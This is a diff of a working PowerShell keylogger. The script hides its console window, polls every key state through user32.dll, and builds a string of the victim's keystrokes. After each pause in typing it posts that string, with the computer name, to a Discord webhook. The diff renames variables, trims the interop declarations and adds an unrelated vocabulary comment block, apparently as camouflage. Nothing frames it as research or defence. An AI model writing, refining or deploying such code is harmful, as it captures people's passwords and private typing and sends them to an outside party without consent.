@@ -1,4 +1,7 @@
-
+$dc = "$dc"
+if ($dc.Length -lt 120){
+	$dc = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -13,132 +16,98 @@ else{
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
-$dc = "$dc"
-if ($dc.Length -lt 120){
-	$dc = ("https://discord.com/api/webhooks/" + "$dc")
-}
-
 <#
-Ablaze – On fire; brightly burning with intensity.
+Ablaze â€“ On fire; brightly burning with intensity.
 
-Banter – Playful, teasing talk between close friends.
+Banter â€“ Playful, teasing talk between close friends.
 
-Crisp – Firm, dry, and easily breakable texture.
+Crisp â€“ Firm, dry, and easily breakable texture.
 
-Dapper – Stylish, neat man with elegant appearance.
+Dapper â€“ Stylish, neat man with elegant appearance.
 
-Elicit – Draw out a response or reaction.
+Elicit â€“ Draw out a response or reaction.
 
-Fathom – Understand something deeply, often abstractly.
+Fathom â€“ Understand something deeply, often abstractly.
 
-Glimpse – Quick, brief look without full details.
+Glimpse â€“ Quick, brief look without full details.
 
-Havoc – Widespread destruction; total chaos and disorder.
+Havoc â€“ Widespread destruction; total chaos and disorder.
 
-Imbue – Fill or inspire with certain feelings.
+Imbue â€“ Fill or inspire with certain feelings.
 
-Jovial – Cheerful, friendly, full of good humor.
+Jovial â€“ Cheerful, friendly, full of good humor.
 
-Keen – Sharp, eager, or intellectually perceptive mind.
+Keen â€“ Sharp, eager, or intellectually perceptive mind.
 
-Lurk – Remain hidden, waiting to spring forth.
+Lurk â€“ Remain hidden, waiting to spring forth.
 
-Mirth – Amusement expressed through laughter or cheerfulness.
+Mirth â€“ Amusement expressed through laughter or cheerfulness.
 
-Nimble – Quick and light in movement or action.
+Nimble â€“ Quick and light in movement or action.
 
 #>
 
 $defs = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public class User32 {
-    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-    public static extern short GetAsyncKeyState(int virtualKeyCode);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int GetKeyboardState(byte[] keystate);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int MapVirtualKey(uint uCode, int uMapType);
-
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);
-
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern int GetWindowTextLength(IntPtr hWnd);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    [DllImport("user32.dll")]
-    public static extern bool IsWindowVisible(IntPtr hWnd);
-}
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-
-
 $defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
 
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+$LastpressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$Threshold = [TimeSpan]::FromSeconds(10)
 
 While ($true){
-  $keyPressed = $false
+  $iskeyPressed = $false
     try{
-      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with 30 ms delay between keystate check
+      while ($LastpressTime.Elapsed -lt $Threshold) {
       Start-Sleep -Milliseconds 30
-        for ($asc = 8; $asc -le 254; $asc++){
-        $keyst = $defs::GetAsyncKeyState($asc)
+        for ($Collected = 8; $Collected -le 254; $Collected++){
+        $keyst = $defs::GetAsyncKeyState($Collected)
           # If a key is pressed
           if ($keyst -eq -32767) {
           # Restart the inactivity timer
-          $keyPressed = $true
-          $LastKeypressTime.Restart()
+          $iskeyPressed = $true
+          $LastpressTime.Restart()
           $null = [console]::CapsLock
           # Translate the keycode to a letter
-          $vtkey = $defs::MapVirtualKey($asc, 3)
+          $vtkey = $defs::MapVirtualKey($Collected, 3)
           $kbst = New-Object Byte[] 256
-          $checkkbst = $defs::GetKeyboardState($kbst)
-          $logchar = New-Object -TypeName System.Text.StringBuilder
+          $checkState = $defs::GetKeyboardState($kbst)
+          $SaveCharacter = New-Object -TypeName System.Text.StringBuilder
             # Define the key that was pressed          
-            if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BACK]"}
-                if ($asc -eq 13) {$LString = "[ENT]"}
-                if ($asc -eq 27) {$LString = "[ESC]"}
+            if ($defs::ToUnicode($Collected, $vtkey, $kbst, $SaveCharacter, $SaveCharacter.Capacity, 0)) {
+              $LoggedString = $SaveCharacter.ToString()
+                if ($Collected -eq 8) {$LoggedString = "[BACKSP]"}
+                if ($Collected -eq 13) {$LoggedString = "[ENTER]"}
+                if ($Collected -eq 27) {$LoggedString = "[ESC]"}
             # Add the key to sending variable
-            $send += $LString 
+            $send += $LoggedString 
             }
           }
         }
       }
     }
     finally{
-      If ($keyPressed) {
+      If ($iskeyPressed) {
       # Send the saved keys to a webhook
-      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+      $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
       $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
-      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
-      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+      $escmsg = $timestamp+" : "+'`'+$Escaped+'`'
+      $JsonWrapper = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+      IRM -Uri $dc -Method Post -ContentType "application/json" -Body $JsonWrapper
       #Remove log file and reset inactivity check 
       $send = ""
-      $keyPressed = $false
+      $iskeyPressed = $false
       }
     }
   # reset stopwatch before restarting the loop
-  $LastKeypressTime.Restart()
+  $LastpressTime.Restart()
   Start-Sleep -Milliseconds 10
 }
+
